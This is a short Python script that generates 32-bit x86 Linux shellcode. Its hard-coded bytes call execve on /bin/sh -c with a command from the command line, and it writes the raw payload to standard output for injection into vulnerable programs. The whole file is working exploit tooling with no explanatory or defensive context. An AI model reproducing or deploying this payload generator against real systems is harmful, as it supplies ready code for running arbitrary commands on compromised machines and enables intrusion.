import sys

def gen_shellcode(cmd):
	"""Generate shellcode to execute the above command.

	Args:
		cmd - The command you want to execute.

	Return:
		the shellcode to execute the command.
	"""
	shellcode  = b"\xeb\x1d\x5e\x31\xc0\x50\x8d\x46\x0b\x50\x8d\x46\x08\x50\x56\x89"
	shellcode += b"\xe1\xb8\x0b\x00\x00\x00\x89\xf3\xba\x00\x00\x00\x00\xcd\x80\xe8"
	shellcode += b"\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00"
	shellcode += cmd + b"\x00"
	return shellcode

if __name__ == "__main__":
	if(len(sys.argv) < 2):
		print("Syntax: {} [Command]".format(sys.argv[0]))
		exit()

	cmd = " ".join(sys.argv[1:])
	shellcode = gen_shellcode(cmd.encode('UTF-8'))
	sys.stdout.buffer.write(shellcode)

